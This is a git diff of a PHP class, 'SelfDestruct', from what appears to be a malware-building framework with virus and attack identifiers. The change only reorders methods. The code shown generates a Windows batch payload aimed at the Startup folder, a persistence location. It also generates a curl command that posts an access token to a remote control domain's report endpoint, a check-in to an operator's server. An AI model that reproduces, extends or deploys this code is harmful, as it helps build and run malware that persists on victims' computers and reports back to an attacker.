@@ -25,23 +25,6 @@ class SelfDestruct extends AttackBase {
         return $this->access_token;
     }
 
-    protected function setState(string $json): void {
-        $state = json_decode($json, true);
-        $this->access_token = $state["access_token"];
-    }
-
-    protected function getState(): string {
-        $state = [];
-        $state["access_token"] = $this->access_token;
-        return json_encode($state);
-    }
-
-    private function generateUploadCode(): string {
-        ob_start(); ?>
-        curl --form "access_token=<?php echo $this->access_token; ?>" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
-        <?php return ob_get_clean();
-    }
-
     public function generateBatchCode(): string {
         ob_start();
         $startup_directory = "%appData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
@@ -52,6 +35,23 @@ class SelfDestruct extends AttackBase {
         <?php return ob_get_clean(); //@formatter:on
     }
 
+    private function generateUploadCode(): string {
+        ob_start(); ?>
+        curl --form "access_token=<?php echo $this->access_token; ?>" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
+        <?php return ob_get_clean();
+    }
+
     public function processExtras(string $resourceIdentifier): void {
+    }
+
+    protected function setState(string $json): void {
+        $state = json_decode($json, true);
+        $this->access_token = $state["access_token"];
+    }
+
+    protected function getState(): string {
+        $state = [];
+        $state["access_token"] = $this->access_token;
+        return json_encode($state);
     }
 }
